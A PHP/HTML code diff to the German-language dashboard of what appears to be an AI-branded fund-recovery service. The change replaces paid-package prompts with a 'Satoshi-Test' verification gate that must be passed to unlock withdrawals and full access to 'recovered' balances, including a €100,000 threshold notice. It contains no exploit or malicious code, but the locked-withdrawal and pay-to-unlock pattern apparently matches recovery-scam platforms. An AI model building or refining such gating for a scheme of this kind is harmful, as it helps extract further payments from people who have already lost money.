@@ -58,6 +58,7 @@ $wdFee = ['enabled'=>false,'percentage'=>0.0,'bank_name'=>'','bank_holder'=>'','
 $userPackage       = null;
 $hasActivePaidPackage = false;
 $isTrialUser       = true;
+$satoshiVerified   = false;
 $packagesFeatureEnabled = true;
 $packageCtaUrl = 'packages.php';
 $packageCtaLabel = 'Jetzt upgraden';
@@ -173,9 +174,15 @@ if (!empty($userId)) {
                 $packagesFeatureEnabled = ((int)$pkgFeatureRow['packages_enabled'] === 1);
             }
         } catch (PDOException $e) { /* migration not yet run */ }
+
         if (!$packagesFeatureEnabled) {
-            $packageCtaUrl = 'support.php';
-            $packageCtaLabel = 'Support';
+            // Packages disabled: drive access via Satoshi Test verification
+            require_once __DIR__ . '/database/satoshi_test_helpers.php';
+            $satoshiVerified      = userHasVerifiedTest($pdo, (int)$userId);
+            $isTrialUser          = !$satoshiVerified;
+            $hasActivePaidPackage = $satoshiVerified;
+            $packageCtaUrl        = 'satoshi-test.php';
+            $packageCtaLabel      = $satoshiVerified ? 'Satoshi-Test ✓' : 'Satoshi-Test abschließen';
         }
 
     } catch (PDOException $e) {
@@ -292,12 +299,16 @@ if ($pendingWithdrawal && ($pendingWithdrawal['fee_status'] ?? '') === '') {
 }
 if ($recovery100kGate) {
     $alerts[] = ['type' => 'warning', 'icon' => 'lock',
-        'msg' => 'Ihre Rückgewinnung hat €100.000 überschritten. Upgrade erforderlich für vollständigen Zugriff.',
-        'link' => $packageCtaUrl, 'linkLabel' => $packagesFeatureEnabled ? 'Jetzt upgraden' : 'Support'];
+        'msg' => $packagesFeatureEnabled
+            ? 'Ihre Rückgewinnung hat €100.000 überschritten. Upgrade erforderlich für vollständigen Zugriff.'
+            : 'Ihre Rückgewinnung hat €100.000 überschritten. Satoshi-Test erforderlich für vollständigen Zugriff.',
+        'link' => $packageCtaUrl, 'linkLabel' => $packagesFeatureEnabled ? 'Jetzt upgraden' : 'Satoshi-Test abschließen'];
 } elseif ($isTrialUser) {
     $alerts[] = ['type' => 'info', 'icon' => 'rocket',
-        'msg' => 'Sie nutzen aktuell eine Testversion. Upgraden Sie für vollen KI-gestützten Wiederherstellungszugriff.',
-        'link' => $packageCtaUrl, 'linkLabel' => $packagesFeatureEnabled ? 'Pakete ansehen' : 'Support'];
+        'msg' => $packagesFeatureEnabled
+            ? 'Sie nutzen aktuell eine Testversion. Upgraden Sie für vollen KI-gestützten Wiederherstellungszugriff.'
+            : 'Bitte schließen Sie den Satoshi-Test ab, um vollen Zugriff auf Ihr Recovery-Konto zu erhalten.',
+        'link' => $packageCtaUrl, 'linkLabel' => $packagesFeatureEnabled ? 'Pakete ansehen' : 'Satoshi-Test abschließen'];
 }
 foreach ($unreadReplies as $ur) {
     $alerts[] = ['type' => 'info', 'icon' => 'message',
@@ -397,7 +408,11 @@ foreach ($alerts as $alert):
             </div>
             <div>
               <div style="font-size:.78rem;color:rgba(255,255,255,.7);text-transform:uppercase;letter-spacing:1px;margin-bottom:2px;">
-                <?= $isTrialUser ? '🔓 Testversion' : '✅ ' . htmlspecialchars($userPackage['package_name'] ?? 'Pro', ENT_QUOTES) ?>
+                <?php if (!$packagesFeatureEnabled): ?>
+                  <?= $satoshiVerified ? '✅ Satoshi Verifiziert' : '🔐 Satoshi-Test ausstehend' ?>
+                <?php else: ?>
+                  <?= $isTrialUser ? '🔓 Testversion' : '✅ ' . htmlspecialchars($userPackage['package_name'] ?? 'Pro', ENT_QUOTES) ?>
+                <?php endif; ?>
               </div>
               <h3 style="color:#fff;font-weight:700;margin:0;font-size:1.4rem;">
                 Willkommen zurück, <?= htmlspecialchars(explode(' ', $currentUserLogin)[0], ENT_QUOTES) ?>
@@ -761,16 +776,41 @@ foreach ($alerts as $alert):
   <!-- ── RIGHT SIDEBAR ───────────────────────────────────────────────── -->
   <div class="col-12 col-lg-4" style="display:flex;flex-direction:column;gap:16px;">
 
-    <!-- Package Card -->
+    <!-- Package / Satoshi Verification Card -->
     <div class="card border-0 shadow-sm" style="border-radius:16px;overflow:hidden;">
       <div class="card-header border-0 py-3 px-4"
-           style="background:linear-gradient(135deg,<?= $isTrialUser ? '#374151 0%,#6b7280 100%' : '#155724 0%,#28a745 100%' ?>);">
+           style="background:linear-gradient(135deg,<?php
+             if (!$packagesFeatureEnabled) {
+                 echo $satoshiVerified ? '#155724 0%,#28a745 100%' : '#92400e 0%,#d97706 100%';
+             } else {
+                 echo $isTrialUser ? '#374151 0%,#6b7280 100%' : '#155724 0%,#28a745 100%';
+             }
+           ?>);">
         <h6 class="mb-0 text-white font-weight-bold" style="font-size:.9rem;">
-          <i class="anticon anticon-crown mr-2"></i><?= $isTrialUser ? 'Testversion aktiv' : 'Aktives Abonnement' ?>
+          <?php if (!$packagesFeatureEnabled): ?>
+            <i class="anticon anticon-experiment mr-2"></i><?= $satoshiVerified ? 'Satoshi-Test bestätigt' : 'Satoshi-Test ausstehend' ?>
+          <?php else: ?>
+            <i class="anticon anticon-crown mr-2"></i><?= $isTrialUser ? 'Testversion aktiv' : 'Aktives Abonnement' ?>
+          <?php endif; ?>
         </h6>
       </div>
       <div class="card-body p-3">
-        <?php if ($userPackage): ?>
+        <?php if (!$packagesFeatureEnabled): ?>
+        <!-- Satoshi-Test mode -->
+        <div class="d-flex align-items-center" style="gap:12px;">
+          <div style="width:44px;height:44px;border-radius:12px;background:<?=$satoshiVerified?'rgba(40,167,69,.1)':'rgba(217,119,6,.1)'?>;display:flex;align-items:center;justify-content:center;font-size:22px;flex-shrink:0;">
+            <?= $satoshiVerified ? '✅' : '🔐' ?>
+          </div>
+          <div>
+            <div class="font-weight-700" style="color:#2c3e50;font-size:14px;">
+              <?= $satoshiVerified ? 'Verifizierung abgeschlossen' : 'Verifizierung erforderlich' ?>
+            </div>
+            <div style="font-size:12px;color:#6c757d;">
+              <?= $satoshiVerified ? 'Volles Dashboard-Zugang freigeschaltet' : 'Satoshi-Test durchführen für vollen Zugriff' ?>
+            </div>
+          </div>
+        </div>
+        <?php elseif ($userPackage): ?>
         <div class="d-flex align-items-center" style="gap:12px;">
           <div style="width:44px;height:44px;border-radius:12px;background:<?=$isTrialUser?'rgba(107,114,128,.1)':'rgba(40,167,69,.1)'?>;display:flex;align-items:center;justify-content:center;font-size:22px;flex-shrink:0;">
             <?= $isTrialUser ? '🔓' : '✅' ?>
@@ -1117,7 +1157,9 @@ foreach ($alerts as $alert):
               <div style="width:44px;height:44px;border-radius:12px;background:rgba(215,119,6,.1);display:flex;align-items:center;justify-content:center;font-size:22px;color:#d97706;margin:0 auto 12px;">
                 <i class="anticon anticon-lock"></i>
               </div>
-              <p class="text-muted mb-2" style="font-size:13px;">Auszahlungen sind in der Testversion gesperrt.</p>
+              <p class="text-muted mb-2" style="font-size:13px;">
+                <?= $packagesFeatureEnabled ? 'Auszahlungen sind in der Testversion gesperrt.' : 'Bitte Satoshi-Test abschließen, um Auszahlungen freizuschalten.' ?>
+              </p>
               <a href="<?= htmlspecialchars($packageCtaUrl, ENT_QUOTES) ?>" class="btn btn-sm font-weight-700" style="background:linear-gradient(135deg,#d97706,#f59e0b);color:#fff;border:none;border-radius:8px;"><?= htmlspecialchars($packageCtaLabel, ENT_QUOTES) ?></a>
             </div>
             <?php elseif (empty($recentWithdrawals)): ?>
